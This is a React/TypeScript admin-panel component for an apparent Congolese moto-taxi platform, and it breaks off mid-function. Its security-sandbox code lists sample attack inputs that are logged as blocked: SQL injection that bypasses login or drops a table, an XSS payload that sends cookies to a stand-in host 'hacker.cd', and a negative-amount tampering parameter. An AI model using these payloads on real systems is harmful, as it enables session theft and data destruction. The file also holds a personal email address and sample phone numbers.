/**
 * @license
 * SPDX-License-Identifier: Apache-2.5
 */

import React, { useState, useEffect } from "react";
import { UserProfile, AdminModificationRequest, DRCAddress, AuditLog } from "../types";
import { logAuditEvent, fetchAuditLogs, subscribeToAuditLogs } from "../utils/auditLogger";
import PartnershipProposals from "./PartnershipProposals";
import { AdminPromotionPanel } from "./PromotionManager";
import { useT } from "./Translate";
import { 
  ShieldAlert, 
  Check, 
  X, 
  User, 
  ShieldCheck, 
  Clock, 
  ChevronRight, 
  Search, 
  MapPin, 
  Lock,
  Building,
  Bike,
  Eye,
  Info,
  Smartphone,
  Wallet,
  RefreshCw,
  CheckCircle,
  Wifi,
  UserX,
  Map,
  Trash2,
  Edit,
  Plus,
  CreditCard,
  FileText,
  Printer,
  BookOpen,
  Briefcase,
  IdCard,
  Server,
  Key,
  RotateCcw,
  AlertTriangle,
  Database,
  Activity,
  Shield
} from "lucide-react";
import { drcProvinces } from "../data/drcLocations";
import { SecurityEvent, getPresetSecurityEvents, getRandomKinshasaIP } from "../lib/securityGuard";
import MapDisplay from "./MapDisplay";
import {
  ResponsiveContainer,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  Legend,
  Cell,
  PieChart,
  Pie,
  LineChart,
  Line,
  AreaChart,
  Area
} from "recharts";

export interface WithdrawalRequest {
  id: string;
  userId: string;
  userName: string;
  userPhone: string;
  userRole: "driver" | "owner";
  amount: number;
  currency: "CDF" | "USD";
  operator: "M-Pesa" | "Orange Money" | "Airtel Money" | "Wave";
  operatorPhone: string;
  requestedAt: string;
  status: "pending" | "approved" | "rejected";
  adminNotes?: string;
}

export interface ProvinceData {
  name: string;
  code: string;
  rides: number;
  motards: number;
  clients: number;
  revenue: number;
  rating: number;
}

export const PROVINCES_26_DATA: ProvinceData[] = [
  { name: "Kinshasa", code: "KIN", rides: 14520, motards: 1250, clients: 8800, revenue: 43560000, rating: 4.8 },
  { name: "Haut-Katanga", code: "HKA", rides: 9840, motards: 850, clients: 5400, revenue: 29520000, rating: 4.7 },
  { name: "Nord-Kivu", code: "NKI", rides: 8210, motards: 720, clients: 4900, revenue: 24630000, rating: 4.6 },
  { name: "Kongo Central", code: "KCE", rides: 6540, motards: 580, clients: 3900, revenue: 19620000, rating: 4.7 },
  { name: "Lualaba", code: "LUA", rides: 5920, motards: 510, clients: 3200, revenue: 17760000, rating: 4.8 },
  { name: "Sud-Kivu", code: "SKI", rides: 5410, motards: 490, clients: 3100, revenue: 16230000, rating: 4.5 },
  { name: "Kasaï-Oriental", code: "KOR", rides: 4120, motards: 380, clients: 2400, revenue: 12360000, rating: 4.4 },
  { name: "Kasaï-Central", code: "KCC", rides: 3850, motards: 350, clients: 2200, revenue: 11550000, rating: 4.5 },
  { name: "Tshopo", code: "TSH", rides: 3620, motards: 340, clients: 2100, revenue: 10860000, rating: 4.6 },
  { name: "Ituri", code: "ITU", rides: 3210, motards: 300, clients: 1900, revenue: 9630000, rating: 4.3 },
  { name: "Kwilu", code: "KWI", rides: 2840, motards: 260, clients: 1600, revenue: 8520000, rating: 4.5 },
  { name: "Équateur", code: "EQU", rides: 2650, motards: 240, clients: 1500, revenue: 7950000, rating: 4.4 },
  { name: "Maniema", code: "MAN", rides: 1980, motards: 180, clients: 1100, revenue: 5940000, rating: 4.5 },
  { name: "Kwango", code: "KWA", rides: 1850, motards: 170, clients: 1050, revenue: 5550000, rating: 4.4 },
  { name: "Tanganyika", code: "TAN", rides: 1720, motards: 160, clients: 950, revenue: 5160000, rating: 4.3 },
  { name: "Haut-Lomami", code: "HLO", rides: 1540, motards: 140, clients: 880, revenue: 4620000, rating: 4.2 },
  { name: "Lomami", code: "LOM", rides: 1420, motards: 130, clients: 820, revenue: 4260000, rating: 4.4 },
  { name: "Kasaï", code: "KAS", rides: 1350, motards: 120, clients: 780, revenue: 4050000, rating: 4.3 },
  { name: "Sankuru", code: "SAN", rides: 1210, motards: 110, clients: 700, revenue: 3630000, rating: 4.2 },
  { name: "Mongala", code: "MON", rides: 1150, motards: 100, clients: 650, revenue: 3450000, rating: 4.3 },
  { name: "Sud-Ubangi", code: "SUB", rides: 1080, motards: 95, clients: 620, revenue: 3240000, rating: 4.4 },
  { name: "Nord-Ubangi", code: "NUB", rides: 980, motards: 90, clients: 580, revenue: 2940000, rating: 4.3 },
  { name: "Bas-Uele", code: "BUE", rides: 840, motards: 80, clients: 500, revenue: 2520000, rating: 4.1 },
  { name: "Haut-Uele", code: "HUE", rides: 790, motards: 75, clients: 460, revenue: 2370000, rating: 4.2 },
  { name: "Mai-Ndombe", code: "MND", rides: 720, motards: 70, clients: 420, revenue: 2160000, rating: 4.3 },
  { name: "Tshuapa", code: "TSU", rides: 610, motards: 60, clients: 350, revenue: 1830000, rating: 4.2 }
];

interface AdminPanelProps {
  adminProfile?: UserProfile;
  modRequests: AdminModificationRequest[];
  onReviewRequest: (id: string, status: "approved" | "rejected", notes?: string) => void;
  onUpdateUserStatus: (userId: string, status: "approved" | "pending" | "rejected") => void;
  onUpdateUsersList?: (users: UserProfile[]) => void;
  registeredUsers: UserProfile[];
  onBackToApp: () => void;
  lang?: any;
  submittedTaxDocs?: any[];
  onReviewTaxDoc?: (id: string, status: "approved" | "rejected", adminNotes?: string) => void;
  sosAlerts?: any[];
  onResolveSOSAlert?: (id: string, notes: string) => void;
}

export default function AdminPanel({
  adminProfile,
  modRequests,
  onReviewRequest,
  onUpdateUserStatus,
  onUpdateUsersList,
  registeredUsers,
  onBackToApp,
  lang = "fr",
  submittedTaxDocs = [],
  onReviewTaxDoc,
  sosAlerts = [],
  onResolveSOSAlert,
}: AdminPanelProps) {
  const t = useT(lang);
  const [activeSubTab, setActiveSubTab] = useState<"requests" | "users" | "documents" | "emergencies" | "transactions" | "partenariats" | "delegation" | "roles" | "cgu_staff" | "security_waf" | "analytics" | "audits" | "promotions">("requests");
  const [docAuditingSubTab, setDocAuditingSubTab] = useState<"identities" | "owner_fleets" | "cross_enrollments">("identities");
  const [adminNotes, setAdminNotes] = useState<Record<string, string>>({});
  
  // Real-time remote and cached audit logs
  const [localAuditLogs, setLocalAuditLogs] = useState<AuditLog[]>([]);
  const [isLoadingLogs, setIsLoadingLogs] = useState<boolean>(false);
  const [selectedLog, setSelectedLog] = useState<AuditLog | null>(null);
  const [logSearchQuery, setLogSearchQuery] = useState<string>("");
  const [activeActionFilter, setActiveActionFilter] = useState<string>("ALL");
  const [activeUserFilter, setActiveUserFilter] = useState<string>("ALL");
  const [activeDateFilter, setActiveDateFilter] = useState<string>("");

  // Load audit logs using real-time Firestore stream
  useEffect(() => {
    if (activeSubTab === "audits") {
      setIsLoadingLogs(true);
      const unsubscribe = subscribeToAuditLogs((logs) => {
        setLocalAuditLogs(logs);
        setIsLoadingLogs(false);
      }, 100);
      return () => unsubscribe();
    }
  }, [activeSubTab]);

  const adminId = adminProfile?.id || "system";
  const adminEmail = adminProfile?.email || "admin@gomoto.cd";
  const adminName = adminProfile ? `${adminProfile.firstName} ${adminProfile.lastName}` : "Super Admin RDC";
  const [showRoleModal, setShowRoleModal] = useState(false);
  const [newRoleName, setNewRoleName] = useState("");
  const [newRoleAbbr, setNewRoleAbbr] = useState("");
  const [newRoleDesc, setNewRoleDesc] = useState("");
  const [systemRoles, setSystemRoles] = useState([
    { id: "sa", abbr: "SA", name: "Super Administrateur", desc: "Contrôle total du système", color: "purple" },
    { id: "md", abbr: "MD", name: "Modérateur Arbitrage", desc: "Gestion des litiges et alertes SOS", color: "indigo" },
    { id: "fv", abbr: "FV", name: "Vérificateur Financier", desc: "Validation documents & retraits", color: "emerald" },
    { id: "cs", abbr: "CS", name: "Support Client", desc: "Vue lecture seule & requêtes", color: "slate" }
  ]);
  const [selectedRole, setSelectedRole] = useState(systemRoles[0].id);

  // Province interactive analytics states
  const [provinceDataList, setProvinceDataList] = useState<ProvinceData[]>(() => {
    const saved = localStorage.getItem("gomoto_provinces_analytics_v1");
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        return PROVINCES_26_DATA;
      }
    }
    return PROVINCES_26_DATA;
  });

  const [selectedProvince, setSelectedProvince] = useState<ProvinceData>(() => {
    const saved = localStorage.getItem("gomoto_provinces_analytics_v1");
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (parsed && parsed.length > 0) return parsed[0];
      } catch (e) {}
    }
    return PROVINCES_26_DATA[0];
  });

  const [searchProvince, setSearchProvince] = useState<string>("");
  const [provinceSortField, setProvinceSortField] = useState<keyof ProvinceData>("rides");
  const [provinceSortOrder, setProvinceSortOrder] = useState<"asc" | "desc">("desc");
  const [chartType, setChartType] = useState<"bar" | "line" | "pie">("bar");
  const [simNewRidesAmount, setSimNewRidesAmount] = useState<number>(500);

  // Security Sandbox States
  const [securityEvents, setSecurityEvents] = useState<SecurityEvent[]>(() => {
    const saved = localStorage.getItem("gomoto_security_events_admin");
    return saved ? JSON.parse(saved) : getPresetSecurityEvents();
  });
  const [blockedAttack, setBlockedAttack] = useState<SecurityEvent | null>(null);
  const [selectedSimulatedAttack, setSelectedSimulatedAttack] = useState<string>("sqli_bypass");
  const [ipBanCountdown, setIpBanCountdown] = useState<number>(0);
  const [isIntegrityChecking, setIsIntegrityChecking] = useState<boolean>(false);
  const [integrityStatus, setIntegrityStatus] = useState<"secure" | "checking" | "warning">("secure");
  const [offlineModeSimulated, setOfflineModeSimulated] = useState<boolean>(() => {
    return localStorage.getItem("gomoto_offline_sim") === "true";
  });
  const [lastCacheSyncString, setLastCacheSyncString] = useState<string>("");

  // Interactive Cyber Security sandbox states for user recommended items
  const [recOtpPhone, setRecOtpPhone] = useState<string>("+243 998 440 119");
  const [recOtpCarrier, setRecOtpCarrier] = useState<"airtel" | "vodacom" | "orange">("airtel");
  const [recGeneratedOtp, setRecGeneratedOtp] = useState<string>("");
  const [recEnteredOtp, setRecEnteredOtp] = useState<string>("");
  const [recOtpStatus, setRecOtpStatus] = useState<"idle" | "sent" | "success" | "invalid">("idle");
  const [recOtpNotify, setRecOtpNotify] = useState<string | null>(null);

  const [recPlayIntActive, setRecPlayIntActive] = useState<boolean>(false);
  const [recPlayIntStep, setRecPlayIntStep] = useState<number>(0);
  const [recPlayIntResult, setRecPlayIntResult] = useState<"idle" | "evaluating" | "passed" | "spoof_warning" | "root_warning">("idle");

  const [recPinningMitmSimulated, setRecPinningMitmSimulated] = useState<boolean>(false);
  const [recPinningStatus, setRecPinningStatus] = useState<"pinned" | "hijacked" | "mitm_blocked">("pinned");

  const [recBounties, setRecBounties] = useState<{id: string; reporter: string; severity: "low" | "medium" | "high" | "critical"; desc: string; reward: string; date: string; status: "validé" | "payé"}[]>(() => {
    const saved = localStorage.getItem("gomoto_bug_bounties_v1");
    if (saved) {
      try { return JSON.parse(saved); } catch(e) {}
    }
    return [
      { id: "BB-01", reporter: "Caleb Banza (CyberRDC)", severity: "critical", desc: "Contournement de signature sur l'enrôlement de la vignette provinciale par injection de certificat", reward: "2,500,000 CDF", date: "10/06/2026", status: "payé" },
      { id: "BB-02", reporter: "Prisca Ngoy (KinSecure)", severity: "medium", desc: "Fuite d'UID de transaction non-chiffrée dans les logs de console Android", reward: "600,000 CDF", date: "11/06/2026", status: "validé" }
    ];
  });
  const [newBountyReporter, setNewBountyReporter] = useState<string>("");
  const [newBountySeverity, setNewBountySeverity] = useState<"low" | "medium" | "high" | "critical">("medium");
  const [newBountyDesc, setNewBountyDesc] = useState<string>("");
  const [activeSandboxTab, setActiveSandboxTab] = useState<"otp" | "integrity" | "pinning" | "bounty">("otp");

  // Helper for Pie Chart rendering top 5 provinces vs grouped others
  const getPieData = () => {
    const sorted = [...provinceDataList].sort((a, b) => b.rides - a.rides);
    const top5 = sorted.slice(0, 5);
    const others = sorted.slice(5);
    const othersSumRides = others.reduce((acc, p) => acc + p.rides, 0);
    const pieData = top5.map((p, index) => {
      const colors = ["#4F46E5", "#10B981", "#3B82F6", "#F59E0B", "#EC4899"];
      return {
        name: p.name,
        code: p.code,
        rides: p.rides,
        revenue: p.revenue,
        color: colors[index % colors.length]
      };
    });
    if (othersSumRides > 0) {
      pieData.push({
        name: "Autres Provinces (21)",
        code: "AUTRES",
        rides: othersSumRides,
        revenue: others.reduce((acc, p) => acc + p.revenue, 0),
        color: "#64748B"
      });
    }
    return pieData;
  };

  // Tooltip component helper
  const CustomTooltip = ({ active, payload }: any) => {
    if (active && payload && payload.length) {
      const data = payload[0].payload;
      return (
        <div className="bg-slate-900 border border-slate-700/80 p-3 rounded-xl shadow-xl text-left text-xs text-white max-w-sm space-y-1 z-50">
          <div className="flex justify-between items-center gap-2">
            <span className="font-extrabold text-[12px] text-yellow-400 uppercase tracking-wide">{data.name}</span>
            <span className="bg-indigo-900 text-indigo-300 font-mono font-bold text-[9px] px-1.5 py-0.5 rounded uppercase">{data.code}</span>
          </div>
          <div className="border-t border-slate-750 my-1.5"></div>
          <p className="text-slate-350">Courses réelles : <span className="font-extrabold text-white font-mono">{data.rides.toLocaleString()} runs</span></p>
          <p className="text-slate-350">Motards certifiés : <span className="font-bold text-slate-205 font-mono">{data.motards.toLocaleString()}</span></p>
          <p className="text-slate-350">Passagers citadins : <span className="font-bold text-slate-205 font-mono">{data.clients.toLocaleString()}</span></p>
          <p className="text-emerald-400 font-bold">Revenue total : <span className="font-mono">{(data.revenue).toLocaleString()} CDF</span></p>
          <div className="flex items-center gap-1 mt-1 text-[10px] text-yellow-500 font-bold">
            <span>★ {data.rating.toFixed(1)} / 5 Index de Satisfaction</span>
          </div>
        </div>
      );
    }
    return null;
  };

  // Simulating courses
  const handleSimulateRides = (amountToSimulate: number) => {
    if (!selectedProvince) return;
    const updatedList = provinceDataList.map((p) => {
      if (p.code === selectedProvince.code) {
        const newRides = p.rides + amountToSimulate;
        const additionalRevenue = amountToSimulate * 3000;
        const newRevenue = p.revenue + additionalRevenue;
        const newClients = p.clients + Math.round(amountToSimulate * 0.4);
        const newMotards = p.motards + Math.round(amountToSimulate * 0.05);
        const updated = {
          ...p,
          rides: newRides,
          revenue: newRevenue,
          clients: newClients,
          motards: newMotards
        };
        setSelectedProvince(updated);
        return updated;
      }
      return p;
    });
    setProvinceDataList(updatedList);
    localStorage.setItem("gomoto_provinces_analytics_v1", JSON.stringify(updatedList));
    alert(`Rapport d'État - Simulation de courses réussie : +${amountToSimulate.toLocaleString()} courses injectées avec succès dans la province : ${selectedProvince.name}.`);
  };

  // Resetting metrics
  const handleResetProvinceData = () => {
    if (confirm("Voulez-vous vraiment réinitialiser toutes les données de télémesure des 26 provinces de la RDC ?")) {
      localStorage.removeItem("gomoto_provinces_analytics_v1");
      setProvinceDataList(PROVINCES_26_DATA);
      setSelectedProvince(PROVINCES_26_DATA[0]);
      alert("Données de co-régulation provinciales d'usine restaurées avec succès.");
    }
  };

  // Helper methods for Interactive Cyber Security Recommendations sandbox
  const handleSendOtp = () => {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    setRecGeneratedOtp(code);
    setRecOtpStatus("sent");
    setRecOtpNotify(`[SMS d'État - GoMoto ${recOtpCarrier.toUpperCase()}] Code de sécurité OTP : ${code}. Ne partagez jamais ce code.`);
    setTimeout(() => {
      setRecOtpNotify(null);
    }, 15000);
  };

  const handleVerifyOtp = () => {
    if (recEnteredOtp === recGeneratedOtp && recGeneratedOtp !== "") {
      setRecOtpStatus("success");
    } else {
      setRecOtpStatus("invalid");
    }
  };

  const runPlayIntegrityCheck = async (simulateInfraction: "none" | "spoof" | "root") => {
    setRecPlayIntActive(true);
    setRecPlayIntResult("evaluating");
    setRecPlayIntStep(1); // "Connexion aux serveurs API Google Play Protect..."
    
    await new Promise(r => setTimeout(r, 600));
    setRecPlayIntStep(2); // "Analyse de la signature de l'empreinte APK..."
    
    await new Promise(r => setTimeout(r, 700));
    setRecPlayIntStep(3); // "Contrôle d'accès privilégié (Su/Superuser/Roots)..."
    
    await new Promise(r => setTimeout(r, 600));
    setRecPlayIntStep(4); // "Détection d'applications de simulation GPS (Spoofing)..."
    
    await new Promise(r => setTimeout(r, 800));
    if (simulateInfraction === "spoof") {
      setRecPlayIntResult("spoof_warning");
    } else if (simulateInfraction === "root") {
      setRecPlayIntResult("root_warning");
    } else {
      setRecPlayIntResult("passed");
    }
    setRecPlayIntActive(false);
  };

  const handleSimulateBounty = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newBountyReporter || !newBountyDesc) {
      alert("S'il vous plaît, indiquez le nom du hacker éthique et la description de la vulnérabilité.");
      return;
    }
    let reward = "100,000 CDF";
    if (newBountySeverity === "critical") reward = "2,500,000 CDF";
    else if (newBountySeverity === "high") reward = "1,200,000 CDF";
    else if (newBountySeverity === "medium") reward = "600,000 CDF";
    else if (newBountySeverity === "low") reward = "200,000 CDF";

    const newReport = {
      id: "BB-" + (recBounties.length + 1).toString().padStart(2, "0"),
      reporter: newBountyReporter,
      severity: newBountySeverity,
      desc: newBountyDesc,
      reward,
      date: new Date().toLocaleDateString("fr-FR"),
      status: "validé" as const
    };

    const updated = [newReport, ...recBounties];
    setRecBounties(updated);
    localStorage.setItem("gomoto_bug_bounties_v1", JSON.stringify(updated));
    setNewBountyReporter("");
    setNewBountyDesc("");
    alert(`Rapport d'Intégrité : Vulnérabilité signalée ! Félicitations à l'analyste de sécurité ${newBountyReporter} d'aider à sécuriser le réseau GoMoto RDC. Reward: ${reward}.`);
  };

  // Sorting list logic
  const sortedAndFilteredProvinces = provinceDataList
    .filter((p) => 
      p.name.toLowerCase().includes(searchProvince.toLowerCase()) ||
      p.code.toLowerCase().includes(searchProvince.toLowerCase())
    )
    .sort((a, b) => {
      const valA = a[provinceSortField];
      const valB = b[provinceSortField];
      if (typeof valA === "string" && typeof valB === "string") {
        return provinceSortOrder === "asc"
          ? valA.localeCompare(valB)
          : valB.localeCompare(valA);
      }
      return provinceSortOrder === "asc"
        ? (valA as number) - (valB as number)
        : (valB as number) - (valA as number);
    });

  useEffect(() => {
    localStorage.setItem("gomoto_security_events_admin", JSON.stringify(securityEvents));
  }, [securityEvents]);

  useEffect(() => {
    if (ipBanCountdown > 0) {
      const t = setTimeout(() => setIpBanCountdown(prev => prev - 1), 1000);
      return () => clearTimeout(t);
    }
  }, [ipBanCountdown]);

  const handleExecuteSimulatedAttack = () => {
    let rawInput = "";
    let threatType: SecurityEvent["threatType"] = "SQL Injection (SQLi)";
    let details = "";
    let riskScore: "MEDIUM" | "HIGH" | "CRITICAL" = "HIGH";

    if (selectedSimulatedAttack === "sqli_bypass") {
      rawInput = "admin' OR 1=1; --";
      threatType = "SQL Injection (SQLi)";
      riskScore = "CRITICAL";
      details = "Tentative d'évasion SQL pour court-circuiter l'authentification admin par ruse de commentaire '--'.";
    } else if (selectedSimulatedAttack === "sqli_ddl") {
      rawInput = "5000; DROP TABLE WalletTransactions; --";
      threatType = "SQL Injection (SQLi)";
      riskScore = "CRITICAL";
      details = "Injection de commandes DDL malveillantes cherchant à altérer la structure de la base de données.";
    } else if (selectedSimulatedAttack === "xss_cookie_steal") {
      rawInput = "<script>document.location='http://hacker.cd/steal?c='+document.cookie</script>";
      threatType = "Cross-Site Scripting (XSS)";
      riskScore = "HIGH";
      details = "Tentative d'extraction de jetons de session locale par chargement de script distant.";
    } else if (selectedSimulatedAttack === "xss_img_onerror") {
      rawInput = "<img src=x onerror=alert('GoMoto_Defaced')>";
      threatType = "Cross-Site Scripting (XSS)";
      riskScore = "HIGH";
      details = "Injection XSS cherchant à détériorer le visuel de la carte ou des éléments de course.";
    } else if (selectedSimulatedAttack === "parameter_negative_recharge") {
      rawInput = "rechargeAmount=-500000";
      threatType = "Falsification de Paramètres";
      riskScore = "CRITICAL";
      details = "Contournement des limites du montant en modifiant l'état client pour de faux décaissements.";
    } else if (selectedSimulatedAttack === "brute_force_flood") {
      rawInput = "68 requêtes par seconde";
      threatType = "Tentative Force Brute / Déni de Service (DDoS)";
      riskScore = "HIGH";
      details = "Saturation de l'API de géolocalisation par envois automatisés.";
    }

    const { ip, commune } = getRandomKinshasaIP();
    const newSim: SecurityEvent = {
      id: "sh-evt-" + Math.random().toString(36).substr(2, 6),
      timestamp: new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
      threatType,
      rawInput,
      sourceIp: `${ip} (${commune})`,
      actionTaken: threatType.includes("Force Brute") ? "ADRESSE IP VERROUILLÉE" : "BLOCKED & REJETÉ",
      riskScore,
      location: `Kinshasa ${commune}`,
      details
    };

    if (threatType.includes("Force Brute")) {
      setIpBanCountdown(60);
    }

    setSecurityEvents(prev => [newSim, ...prev]);
    alert("Simulation lancée ! L'attaque a été détectée et instantanément bloquée par le WAF de GoMoto RDC.");
  };

  const handleTriggerIntegrityCheck = () => {
    setIsIntegrityChecking(true);
    setIntegrityStatus("checking");
    setTimeout(() => {
      setIsIntegrityChecking(false);
      setIntegrityStatus("secure");
      alert("Scan terminé : Tous les certificats d'intégrité de la plateforme GoMoto sont sains et sans altération.");
    }, 1800);
  };
  
  // Delegated co-administrators state
  const [delegatedAdmins, setDelegatedAdmins] = useState<{
    email: string;
    fullName: string;
    role: string;
    status: "active" | "revoked" | "pending";
    addedAt: string;
    privileges: string[];
    province?: string;
    agentNumber?: string;
  }[]>(() => {
    const saved = localStorage.getItem("gomoto_delegated_admins");
    if (saved) {
      try { return JSON.parse(saved); } catch (e) {}
    }
    const defaults = [
      {
        email: "lumulazard5@gmail.com",
        fullName: "Lazard Lumula",
        role: "Administrateur Délégué Principal",
        status: "active" as const,
        addedAt: "10/06/2026",
        privileges: ["full_access", "arbitration_rights", "fiscal_approvals", "sos_dispatching"],
        province: "Kinshasa",
        agentNumber: "GOMOTO-AG-2026-001"
      }
    ];
    localStorage.setItem("gomoto_delegated_admins", JSON.stringify(defaults));
    return defaults;
  });

  // New delegate form states
  const [newDelegateEmail, setNewDelegateEmail] = useState("");
  const [newDelegateName, setNewDelegateName] = useState("");
  const [newDelegateRole, setNewDelegateRole] = useState("Modérateur Adjoint RDC");
  const [newDelegateProvince, setNewDelegateProvince] = useState("Kinshasa");
  const [newDelegateAgentNumber, setNewDelegateAgentNumber] = useState(() => {
    return `GOMOTO-AG-2026-${Math.floor(100 + Math.random() * 900)}`;
  });
  const [selectedIdCardAdmin, setSelectedIdCardAdmin] = useState<{
    email: string;
    fullName: string;
    role: string;
    status: "active" | "revoked" | "pending";
    addedAt: string;
    privileges: string[];
    province?: string;
    agentNumber?: string;
  } | null>(null);

  const [selectedUserDocs, setSelectedUserDocs] = useState<UserProfile | null>(null);
  const [modalAuditNote, setModalAuditNote] = useState("");
  const [checkIdMatches, setCheckIdMatches] = useState(false);
  const [checkNoForgery, setCheckNoForgery] = useState(false);
  const [checkOriginalDoc, setCheckOriginalDoc] = useState(false);
  const [magnifiedPhoto, setMagnifiedPhoto] = useState<"front" | "back" | "profile" | null>(null);

  const [selectedPrivileges, setSelectedPrivileges] = useState<string[]>([
    "arbitration_rights",
    "fiscal_approvals"
  ]);

  const togglePrivilege = (priv: string) => {
    setSelectedPrivileges(prev =>
      prev.includes(priv) ? prev.filter(p => p !== priv) : [...prev, priv]
    );
  };

  const handleAddDelegate = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newDelegateEmail.trim()) return;

    if (delegatedAdmins.some(admin => admin.email.toLowerCase() === newDelegateEmail.trim().toLowerCase())) {
      alert("Cette adresse e-mail dispose déjà d'une délégation active ou en attente.");
      return;
    }

    const newDelegate = {
      email: newDelegateEmail.trim().toLowerCase(),
      fullName: newDelegateName.trim() || "Collaborateur Sans Nom",
      role: newDelegateRole,
      status: "active" as const,
      addedAt: new Date().toLocaleDateString("fr-FR"),
      privileges: selectedPrivileges,
      province: newDelegateProvince,
      agentNumber: newDelegateAgentNumber.trim() || `GOMOTO-AG-2026-${Math.floor(100 + Math.random() * 900)}`
    };

    const updated = [...delegatedAdmins, newDelegate];
    setDelegatedAdmins(updated);
    localStorage.setItem("gomoto_delegated_admins", JSON.stringify(updated));

    // Clear inputs
    setNewDelegateEmail("");
    setNewDelegateName("");
    setNewDelegateRole("Modérateur Adjoint RDC");
    setNewDelegateProvince("Kinshasa");
    setNewDelegateAgentNumber(`GOMOTO-AG-2026-${Math.floor(100 + Math.random() * 900)}`);
    alert(`Délégation d'administration établie avec succès pour ${newDelegate.fullName} (${newDelegate.email}). Numéro d'agent assigné : ${newDelegate.agentNumber}. Un courriel de notification administrative lui a été acheminé.`);
  };

  const handleToggleAdminStatus = async (email: string) => {
    const updated = delegatedAdmins.map(admin => {
      if (admin.email.toLowerCase() === email.toLowerCase()) {
        const nextStatus: typeof admin.status = admin.status === "active" ? "revoked" : "active";
        return { ...admin, status: nextStatus };
      }
      return admin;
    });
    setDelegatedAdmins(updated);
    localStorage.setItem("gomoto_delegated_admins", JSON.stringify(updated));
    
    const affected = updated.find(a => a.email.toLowerCase() === email.toLowerCase());
    if (affected) {
      alert(`Statut de co-délégué modifié : ${affected.fullName} est désormais ${affected.status === "active" ? "ACTIF" : "RÉVOQUÉ"}.`);
      
      const beforeState = delegatedAdmins.find(a => a.email.toLowerCase() === email.toLowerCase());
      await logAuditEvent({
        action: "TOGGLE_ADMIN_STATUS",
        adminId,
        adminEmail,
        adminName,
        targetId: affected.email,
        targetName: affected.fullName,
        details: `Modification de l'habilitation administrative pour ${affected.fullName}. Statut : ${affected.status.toUpperCase()}.`,
        payloadBefore: beforeState,
        payloadAfter: affected
      });
    }
  };
  
  // Custom Map states for emergency coordinates calibration
  const [focusedSOSId, setFocusedSOSId] = useState<string | null>("sos-882d");
  const [sosIntercomActive, setSosIntercomActive] = useState<boolean>(false);
  const [sosIntercomLog, setSosIntercomLog] = useState<string[]>([]);
  const [dispatchedBrigades, setDispatchedBrigades] = useState<Record<string, string>>({});

  // Mobile Money simulated transaction withdrawals
  const [withdrawals, setWithdrawals] = useState<WithdrawalRequest[]>(() => {
    const saved = localStorage.getItem("gomoto_withdr_requests");
    if (saved) {
      try { return JSON.parse(saved); } catch (e) {}
    }
    const initialWithdrawals: WithdrawalRequest[] = [
      {
        id: "WTH-2026-081",
        userId: "usr-driver-881",
        userName: "Rachel NYEMBO",
        userPhone: "+243 998 440 119",
        userRole: "driver",
        amount: 25000,
        currency: "CDF",
        operator: "M-Pesa",
        operatorPhone: "+243 998 440 119",
        requestedAt: "05/06/2026 14:30",
        status: "pending"
      },
      {
        id: "WTH-2026-082",
        userId: "usr-owner-441",
        userName: "Dieudonné MBOKOLO",
        userPhone: "+243 812 770 099",
        userRole: "owner",
        amount: 120,
        currency: "USD",
        operator: "Wave",
        operatorPhone: "+243 812 770 099",
        requestedAt: "05/06/2026 16:10",
        status: "pending"
      },
      {
        id: "WTH-2026-079",
        userId: "usr-driver-777",
        userName: "Héritier LUKUSA",
        userPhone: "+243 821 445 778",
        userRole: "driver",
        amount: 30000,
        currency: "CDF",
        operator: "Orange Money",
        operatorPhone: "+243 821 445 778",
        requestedAt: "04/06/2026 11:15",
        status: "approved",
        adminNotes: "Retrait compensé avec succès sur API Orange Money RDC."
      }
    ];
    localStorage.setItem("gomoto_withdr_requests", JSON.stringify(initialWithdrawals));
    return initialWithdrawals;
  });

  const handleReviewWithdrawal = async (id: string, status: "approved" | "rejected", notes: string) => {
    const updated = withdrawals.map(w => w.id === id ? { ...w, status, adminNotes: notes } : w);
    setWithdrawals(updated);
    localStorage.setItem("gomoto_withdr_requests", JSON.stringify(updated));

    // If approved, deduct matching funds from globally registered users list securely
    const request = withdrawals.find(w => w.id === id);
    if (request) {
      await logAuditEvent({
        action: "REVIEW_WITHDRAWAL",
        adminId,
        adminEmail,
        adminName,
        targetId: id,
        targetName: request.userName,
        details: `Revue du retrait de fonds #${id} (${request.amount} ${request.currency}) par Mobile Money ${request.operator}. Décision : ${status.toUpperCase()}. Notes : ${notes}`,
        payloadBefore: request,
        payloadAfter: { ...request, status, adminNotes: notes }
      });
    }

    if (request && status === "approved") {
      const savedUsers = localStorage.getItem("gomoto_users");
      if (savedUsers) {
        try {
          const users: UserProfile[] = JSON.parse(savedUsers);
          const updatedUsers = users.map(u => {
            if (u.id === request.userId) {
              if (request.currency === "CDF") {
                return { ...u, walletBalanceCDF: Math.max(0, u.walletBalanceCDF - request.amount) };
              } else {
                return { ...u, walletBalanceUSD: parseFloat(Math.max(0, u.walletBalanceUSD - request.amount).toFixed(2)) };
              }
            }
            return u;
          });
          localStorage.setItem("gomoto_users", JSON.stringify(updatedUsers));
          
          // Propagate instantly to current active user profile if matched
          const savedCurrent = localStorage.getItem("gomoto_current_user");
          if (savedCurrent) {
            const currentObj = JSON.parse(savedCurrent);
            if (currentObj.id === request.userId) {
              const uMatch = updatedUsers.find(x => x.id === request.userId);
              if (uMatch) {
                localStorage.setItem("gomoto_current_user", JSON.stringify(uMatch));
              }
            }
          }
        } catch (e) {
          console.error("Local storage sync error", e);
        }
      }
    }
  };

  // Dispatch interactive simulated brigade updates
  const handleDispatchBrigade = async (sosId: string, brigadeType: "pnc" | "gomoto_sec") => {
    const label = brigadeType === "pnc" ? "Patrouille Police Nationale PNC" : "Brigade Intervention Rapide GoMoto";
    setDispatchedBrigades(prev => ({
      ...prev,
      [sosId]: `En route... (${label} mobilisée du commissariat le plus proche)`
    }));
    
    await logAuditEvent({
      action: "DISPATCH_BRIGADE",
      adminId,
      adminEmail,
      adminName,
      targetId: sosId,
      targetName: "SOS Alert Room",
      details: `Expédition immédiate de la force d'arbitrage sécuritaire (${label}) vers l'alerte SOS #${sosId}.`,
    });

    setTimeout(() => {
      setDispatchedBrigades(prev => ({
        ...prev,
        [sosId]: `✓ Sur Place (${label} arrivée sur les lieux, situation stabilisée. Code Vert)`
